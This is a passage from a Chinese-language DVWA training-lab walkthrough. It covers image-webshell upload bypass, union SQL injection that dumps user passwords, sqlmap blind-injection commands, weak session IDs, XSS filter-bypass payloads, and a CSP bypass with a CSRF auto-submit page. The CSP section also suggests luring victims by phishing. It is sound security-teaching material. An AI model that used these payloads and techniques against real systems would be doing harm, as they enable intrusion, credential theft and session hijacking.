$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

// 文件后缀是否是  jpg jpeg png 且文件大小 小于 100000
if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
   ( $uploaded_size < 100000 ) &&

   // 使用 getimagesize 函数进行图片检测
   getimagesize( $uploaded_tmp ) ) {
      上传图片
      }
```

getimagesize 函数会检测文件是否是图片，所以这里我们得通过制作图马来绕过这个函数检测。

- Linux 下 图马制作





 

```bash
# 将 shell.php 内容追加到 pic.png
cat shell.php >> pic.png

# png + php 合成 png 图马
cat pic.png shell.php >> shell.png

# 直接 echo 追加
echo '<?php phpinfo();?>' >> pic.png
```

- Windows 下 图马制作





none

```none
copy pic.png/b+shell.php/a shell.png
```

图马制作完成之后我们就已经可以绕过 getimagesize 函数的检测了，接下来主要是绕过对后缀的检测。这里暂时无法绕过检测，目前只能借助文件包含或者命令执行漏洞来进一步 Getshell 下面演示文件包含漏洞

首先正常上传我们的图马：



![img](https://image.3001.net/images/20200527/15905677165519.png)

**img**



接着直接进行文件包含解析图马：





payload

```payload
/fi/?page=file:///var/www/html/hackable/uploads/pic.png
```



![img](https://image.3001.net/images/20200527/15905678567140.png)



## Impossible

直接来看代码：





php

```php
# 时间戳的 md5 值作为文件名
$target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

# 检测文件后缀、Content-Type类型 以及 getimagesize 函数检测
if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
        ( $uploaded_size < 100000 ) &&
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
        getimagesize( $uploaded_tmp ) ) {

  // 删除元数据 重新生成图像
        if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $temp_file, 100);
        }
        else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $temp_file, 9);
        }
        imagedestroy( $img );
```

文件名随机这里就无法使用截断、重写图片的话，使用图马就也无法绕过。

# SQL Injection SQL 注入

刷完 [SQLI labs 靶场](https://www.sqlsec.com/2020/05/sqlilabs.html)再看这些注入简直小菜一碟 23333

## Low





php

```php
$id = $_REQUEST[ 'id' ]
# 没有过滤就直接带入 SQL 语句中 使用单引号闭合
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
while( $row = mysqli_fetch_assoc( $result ) ) {
        // 回显信息
        $first = $row["first_name"];
        $last  = $row["last_name"];
        $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
```

因为之前输完 SQLi-Labs 靶场了，从源码中来看这里使用最基本的 Union 联合查询注入效率最高，国光这里直接丢最终注入的 Payload 吧：





payload

```payload
/sqli/?id=-1' union select 1,(SELECT+GROUP_CONCAT(user,':',password+SEPARATOR+0x3c62723e)+FROM+users)--+&Submit=Submit#
```



![img](https://image.3001.net/images/20200527/15905836509224.png)



## Medium

和 Low 级别不一样的代码主要区别如下：





php

```php
$id = $_POST[ 'id' ];

$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

可以看到从 GET 型注入变成了 POST 型注入，而且闭合方式不一样，从单引号变成直接拼接到 SQL 语句了。

POST 的数据内容如下：





payload

```payload
id=-1 union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FROM users)&Submit=Submit
```



![img](https://image.3001.net/images/20200527/1590584240851.png)



## High

主要代码如下：





php

```php
$id = $_SESSION[ 'id' ];

$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

从 SESSION 获取 id 值，使用单引号拼接。因为 SESSION 获取值的特点，这里不能直接在当前页面注入，

input 的输入框内容如下：





none

```none
-2' union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FROM users)#
```



![img](https://image.3001.net/images/20200527/15905847152255.png)



## Impossible

这个级别的主要防护代码如下：





php

```php
// Anti-CSRF token 防御 CSRF 攻击
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


$id = $_GET[ 'id' ];
// 检测是否是数字类型
if(is_numeric( $id )) {
  // 预编译
  $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
  $data->bindParam( ':id', $id, PDO::PARAM_INT );
  $data->execute();
  $row = $data->fetch();
```

CSRF、检测 id 是否是数字，prepare 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。

# SQL Injection (Blind) SQL 盲注

盲注是一个比较耗时的工作，因为之前刷完靶场了，国光这里打算使用 sqlmap 演示一下点到为止，感兴趣的朋友建议去系统地刷下 SQLi-Labs 靶场。关于 SQLi-Labs 靶场可以参考我的另一篇文章：[SQLI labs 靶场精简学习记录](https://www.sqlsec.com/2020/05/sqlilabs.html)

## Low

主要区别在这里：





php

```php
if( $num > 0 ) {
  // 查询到结果 只输出如下信息
  $html .= '<pre>User ID exists in the database.</pre>';
}
```

下面尝试直接使用 sqlmap 进行注入：





 

```bash
sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/?id=1*&Submit=Submit#" --cookie="PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=low" --dbms=MySQL --technique=B --random-agent --flush-session -v 3
```

> 因为 DVWA 是有登录机制的，所以这里手动指定 –cookie 来进行会话认证

## Medium

同理也是没有直接输出查询结果的，这里和普通的注入类似，那么这里依然还是直接使用 sqlmap 进行注入：





 

```bash
sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=medium" --data="id=1*&Submit=Submit" --dbms=MySQL --technique=B --random-agent --flush-session -v 3
```

## High





php

```php
$id = $_COOKIE[ 'id' ];

$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

这里是从 Cookie 中获取 id 然后倒入到数据库中查询的，那么知道注入点之后依然可以使用 sqlmap 来进行注入：





 

```bash
sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/" --cookie="id=1*; PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=high" --dbms=MySQL --technique=B --random-agent --flush-session -v 3
```

## Impossible

和上面的关卡一样，CSRF、检测 id 是否是数字、prepare 预编译语来防止 SQL 注入。

# Weak Session IDs 脆弱的 Session

Session 具有会话认证的作用，生成 Session 尽量要无规律 不可逆，否则很容易被恶意用户伪造。

## Low





php

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
```

可以看到 Session 的规律是





php

```php
$_SESSION['last_session_id']++;
```

很容易发现 dvwaSession 的值每次生成就 +1 ，这样很容易被恶意用户去遍历 dvwaSession 来获取用户信息的。

## Medium





php

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();
    setcookie("dvwaSession", $cookie_value);
}
```

根据 time() 时间戳来生成作为 dvwaSession 的值，时间戳实际上也是有规律的，也有猜出的可能，谷歌一下可以找到不少在线时间戳的生成转换工具：[时间戳(Unix timestamp)转换工具 - 在线工具](https://tool.lu/timestamp/)…

## High





php

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id_high'])) {
        $_SESSION['last_session_id_high'] = 0;
    }
    $_SESSION['last_session_id_high']++;
    $cookie_value = md5($_SESSION['last_session_id_high']);
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
}
```

和 Low 级别类似，只是多了一个 MD5编码，不过这个要让我去观察的话 还是得耗费一点时间段 ，直接代码审计查看真的美滋滋

## Impossible

下面来看一下 DVWA 无懈可击的防护方案吧：





php

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = sha1(mt_rand() . time() . "Impossible");
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
}
```

这次dvwaSession 的值为 sha1（随机数+时间+“impossbile”），代码中看是这样的，不过可能是靶场环境问题，国光我并没有成功复现…

# XSS (Reflected) 反射型跨站脚本

XSS 版块实际上国光之前单独写了一篇文章总结过：[XSS从零开始](https://www.sqlsec.com/2020/01/xss.html)

## Low





php

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    $html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

可以看看到对`name`变量没有任何的过滤措施，只是单纯的检测了`name`变量存在并且不为空就直接输出到了网页中。

**payload**





javascript

```javascript
<script>alert('XSS')</script>
```



![img](https://image.3001.net/images/20200527/15905898947801.png)



## Medium





php

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    $html .= "<pre>Hello ${name}</pre>";
}

?>
```

只是简单的过滤了`<script>`标签，可以使用其他的标签绕过，这里因为正则匹配的规则问题，检测到敏感字符就将替换为空（即删除），也可以使用嵌套构造和大小写转换来绕过。

使用其他的标签，通过事件来弹窗，这里有很多就不一一列举了：

**payload1**





none

```none
<img src=x onerror=alert('XSS')>
```

因为过滤规则的缺陷，这里可以使用嵌套构造来绕过：

**payload2**





none

```none
<s<script>cript>alert('XSS')</script>
```

因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过的：

**payload3**





javascript

```javascript
<Script>alert('XSS')</script>
```

## High





php

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    $html .= "<pre>Hello ${name}</pre>";
}

?>
```

这里的正则过滤更加完善了些，不区分大小写，并且使用了通配符去匹配，导致嵌套构造的方法也不能成功，但是还有其他很多标签来达到弹窗的效果：





javascript

```javascript
<img src=x onerror=alert('XSS')>
```

## Impossible





php

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    $html .= "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

`name`变量通过`htmlspecialchars()`函数被HTML实体化后输出在了`<pre>`标签中，目前来说没有什么的姿势可以绕过，如果这个输出在一些标签内的话，还是可以尝试绕过的。

# XSS (DOM) DOM型跨站脚本

## Low





html

```html
<div class="vulnerable_code_area">

         <p>Please choose a language:</p>

        <form name="XSS" method="GET">
            <select name="default">
                <script>
                    if (document.location.href.indexOf("default=") >= 0) {
                        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
                        document.write("<option value='" + lang + "'>" + $decodeURI(lang) + "</option>");
                        document.write("<option value='' disabled='disabled'>----</option>");
                    }

                    document.write("<option value='English'>English</option>");
                    document.write("<option value='French'>French</option>");
                    document.write("<option value='Spanish'>Spanish</option>");
                    document.write("<option value='German'>German</option>");
                </script>
            </select>
            <input type="submit" value="Select" />
        </form>
</div>
```

DOM XSS 是通过修改页面的 DOM 节点形成的 XSS。首先通过选择语言后然后往页面中创建了新的 DOM 节点：





html

```html
document.write("<option value='" + lang + "'>" + $decodeURI(lang) + "</option>");
document.write("<option value='' disabled='disabled'>----</option>");
```

这里的`lang`变量通过`document.location.href`来获取到，并且没有任何过滤就直接URL解码后输出在了`option`标签中，以下payload在`Firefox Developer Edition 56.0b9`版本的浏览器测试成功:

Javascript





javascript

```javascript
?default=English <script>alert('XSS')</script>
```

## Medium





php

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];

    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

对`default`变量进行了过滤，通过`stripos()` 函数查找`<script`字符串在`default`变量值中第一次出现的位置（不区分大小写），如果匹配搭配的话手动通过`location`将URL后面的参数修正为`?default=English`，同样这里可以通过其他的标签搭配事件来达到弹窗的效果。

闭合`</option>`和`</select>`，然后使用`img`标签通过事件来弹窗

**payload1**





javascript

```javascript
?default=English</option></select><img src=x onerror=alert('XSS')>
```

直接利用`input`的事件来弹窗

**payload2**





none

```none
?default=English<input onclick=alert('XSS') />
```

## High





php

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

使用了白名单模式，如果`default`的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为:`?default=English` ，这里只是对 default 的变量进行了过滤。

可以使用`&`连接另一个自定义变量来Bypass

**payload1**





none

```none
?default=English&a=</option></select><img src=x onerror=alert('XSS')>
?default=English&a=<input onclick=alert('XSS') />
```

也可以使用`#`来Bypass

**payload2**





none

```none
?default=English#</option></select><img src=x onerror=alert('XSS')>
?default=English#<input onclick=alert('XSS') />
```

## Impossible





php

```php
# For the impossible level, don't decode the querystring
$decodeURI = "decodeURI";
if ($vulnerabilityFile == 'impossible.php') {
    $decodeURI = "";
}
```

`Impossible` 级别直接不对我们的输入参数进行 URL 解码了，这样会导致标签失效，从而无法XSS

# XSS (Stored) 存储型跨站脚本

## Low





php

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

**payload**





javascript

```javascript
Name: sqlsec
Message: <script>alert('XSS')</script>
```

可以看到我们的payload直接插入到了数据库中了：



![img](https://image.3001.net/images/20200109/15785793564350.png)



测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这条记录。

### trim

**语法**





php

```php
trim(string,charlist)
```

**细节**

移除string字符两侧的预定义字符。

| 参数     | 描述                             |
| :------- | :------------------------------- |
| string   | 必需。规定要检查的字符串。       |
| charlist | 可选。规定从字符串中删除哪些字符 |

`charlist`如果被省略，则移除以下所有字符：

| 符合 | 解释       |
| :--- | :--------- |
| \0   | NULL       |
| \t   | 制表符     |
| \n   | 换行       |
| \x0B | 垂直制表符 |
| \r   | 回车       |
|      | 空格       |

### stripslashes

**语法**





php

```php
stripslashes(string)
```

**细节**

去除掉string字符的反斜杠`\`，该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。

### mysql_real_escape_string

**语法**





php

```php
mysql_real_escape_string(string,connection)
```

**细节**

转义 SQL 语句中使用的字符串中的特殊字符。

| 参数       | 描述                                                  |
| :--------- | :---------------------------------------------------- |
| string     | 必需。规定要转义的字符串。                            |
| connection | 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 |

下列字符受影响：

- \x00
- \n
- \r
- \
- ‘
- “
- \x1a

以上这些函数都只是对数据库进行了防护，却没有考虑到对XSS进行过滤，所以依然可以正常的来XSS

## Medium





php

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

**payload1**





javascript

```javascript
Name: <img src=x onerror=alert('XSS')>
Message: www.sqlsec.com
```

可以看到我们的payload直接插入到了数据库中了：



![img](https://image.3001.net/images/20200109/15785794078171.png)



因为`name`过滤规则的缺陷，同样使用**嵌套构造**和**大小写转换**也是可以 Bypass 的：

**paylaod2**





javascript

```javascript
Name: <Script>alert('XSS')</script>
Message: www.sqlsec.com

Name: <s<script>cript>alert('XSS')</script>
Message: www.sqlsec.com
```

测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这些记录。

### addslashes

**语法**





php

```php
addslashes(string)
```

**细节**

返回在预定义字符之前添加反斜杠的字符串。

预定义字符是：

- 单引号（’）
- 双引号（”）
- 反斜杠（\）
- NULL

### strip_tags

**语法**





php

```php
strip_tags(string,allow)
```

**细节**

剥去字符串中的 HTML、XML 以及 PHP 的标签。

| 参数     | 描述                                       |
| :------- | :----------------------------------------- |
| *string* | 必需。规定要检查的字符串。                 |
| *allow*  | 可选。规定允许的标签。这些标签不会被删除。 |

### htmlspecialchars

**语法**





php

```php
htmlspecialchars(string,flags,character-set,double_encode)
```

**细节**

把预定义的字符转换为 HTML 实体。

预定义的字符是：

- & （和号）成为 `&`
- “ （双引号）成为 `"`
- ‘ （单引号）成为 ‘
- < （小于）成为 `<`
- \> （大于）成为 `>`

`message` 变量几乎把所有的XSS都给过滤了，但是`name`变量只是过滤了``标签而已，我们依然可以在`name`参数尝试使用其他的标签配合事件来触发弹窗。

`name`的input输入文本框限制了长度：





html

```html
<input name="txtName" size="30" maxlength="10" type="text">
```

审查元素手动将`maxlength`的值调大一点就可以了。





html

```html
<input name="txtName" size="50" maxlength="50" type="text">
```

## High





php

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

`message`变量依然是没有什么希望，重点分析下`name`变量，发现仅仅使用了如下规则来过滤，所以依然可以使用其他的标签来Bypass：





javascript

```javascript
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
```

**payload**





javascript

```javascript
Name: <img src=x onerror=alert('XSS')>
Message: www.sqlsec.com
```

## Impossible





php

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );

    // Update database
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
    $data->bindParam( ':message', $message, PDO::PARAM_STR );
    $data->bindParam( ':name', $name, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

`message`和`name`变量都进行了严格的过滤，而且还检测了用户的token：





php

```php
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

有效地防止了 CSRF 的攻击

# Content Security Policy Bypass

CSP 是一种白名单制度，实现和执行全部由浏览器完成，开发者只需提供配置。CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。

## Low





php

```php
<?php
// 允许 self, pastebin.com, jquery and google analytics 的 js
$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"; 

header($headerCSP);

# https://pastebin.com/raw/R570EE00

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    // 直接将 include 内容包含进 script 的 src 标签里面
    <script src='" . $_POST['include'] . "'></script>
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
?>
```

从代码中可以看出白名单的网址如下：





none

```none
self
https://pastebin.com
example.com
code.jquery.com
https://ssl.google-analytics.com
```

其中 pastebin.com 是一个快速分享文本内容的网站，这个内容我们是可控的，可以在这里面插入 XSS 攻击语句：





javascript

```javascript
alert(document.cookie)
```



![img](https://image.3001.net/images/20200528/15906348674334.png)



将网址 `https://pastebin.com/raw/ZFnbmjBU` 填写到文本框中 然后点击 include 即可将这个文件包含进来，从而触发 XSS：



![img](https://image.3001.net/images/20200528/15906349641665.png)



这个时候查看网页源码会发现刚刚的网址被 SRC 给引用进来了：



![img](https://image.3001.net/images/20200528/15906350318425.png)



这里还可以配合 CSRF 让攻击更加自动化：





html

```html
<form method="POST" action="http://127.0.0.1:8888/vulnerabilities/csp/" id="csp">
  <input type="text" name="include" value="">
</form>
<script>
  var form = document.getElementById("csp");
  form[0].value="https://pastebin.com/raw/ZFnbmjBU";
  form.submit();
</script>
```

将上述内容保存为 csrf.html 然后上传到外网服务器上，国光这里临时上传到我的网站根目录下：





payload

```payload
https://www.sqlsec.com/csrf.html
```

将这个地址想方设法让受害者访问的话，就会自动触发 CSRF 和 XSS 攻击。这里可以采用短网址、钓鱼邮件等方法 非常灵活

## Medium





php

```php
$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";

header($headerCSP);

// 关掉 XSS 防护 让 alert 可以顺利执行
header ("X-XSS-Protection: 0");

# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
```

这里使用了 nonce 阮一峰博客里面这么说明的 `script-src`还可以设置一些特殊值。

- `unsafe-inline`：允许执行页面内嵌的`<script>`标签和事件监听函数
- **`unsafe-eval`**：允许将字符串当作代码执行，比如使用`eval`、`setTimeout`、`setInterval`和`Function`等函数。
- `nonce`：每次HTTP回应给出一个授权 token，页面内嵌脚本必须有这个 token，才会执行
- `hash`：列出允许执行的脚本代码的 Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。

这一个关卡使用来了 unsafe-inline 和 nonce ，所以页面内嵌脚本，必须有这个token才能执行：





javascript

```javascript
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```



![img](https://image.3001.net/images/20200528/15906365114430.png)



## High





php

```php
<?php
$headerCSP = "Content-Security-Policy: script-src 'self';";

header($headerCSP);

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
```

可以看到 CSP 规则这里十分苛刻，只能引用允许`self` 的脚本执行，`self`是指本页面加载的脚本。接着看页面提示：



![img](https://image.3001.net/images/20200528/15906367082949.png)



跟进看一下这个 jsonp.php 文件看看：





php

```php
<?php
header("Content-Type: application/json; charset=UTF-8");

if (array_key_exists ("callback", $_GET)) {
    $callback = $_GET['callback'];
} else {
    return "";
}

$outp = array ("answer" => "15");
echo $callback . "(".json_encode($outp).")";
?>
```

点击 Solve the sum 计算按截取到的数据包如下：





http

```http
GET /vulnerabilities/csp/source/jsonp.php?callback=solveSum HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8888/vulnerabilities/csp/
Cookie: PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=high
Connection: close
```

查看元素追踪到 high.js 文件：





payload

```payload
/csp/source/high.js
```

内容如下：





javascript

```javascript
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}

function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}

var solve_button = document.getElementById ("solve");

if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}
```

首先审查元素拿到关键代码：





html

```html
<form name="csp" method="POST">
    <p>The page makes a call to ../..//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/high.js"></script>
```

`id="solve"` 对应下面的 JS 代码：





javascript

```javascript
var solve_button = document.getElementById ("solve");

if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}
```

然后触发 `clickButton()` 函数：





javascript

```javascript
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}
```

这个函数会创建一个 `script` 标签，内容如下：





javascript

```javascript
<script src="http://127.0.0.1:8888/vulnerabilities/csp/source/jsonp.php?callback=solveSum"></script>
```

这个时候浏览器就会发起如下请求：





payload

```payload
http://127.0.0.1:8888/vulnerabilities/csp/source/jsonp.php?callback=solveSum
```

下面就属于 JSONP 的姿势了，细节可以参考我之前写的这篇文章:[6.3.2 JSON-P](https://www.sqlsec.com/2020/04/jsonbook.html#toc-heading-35)

访问这个 jsonp.php 会得到如下请求：





json

```json
solveSum({"answer":"15"})
```



![img](https://image.3001.net/images/20200528/15906383164654.png)



然后就会调用 JS 的 solveSum 函数：





javascript

```javascript
function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}
```

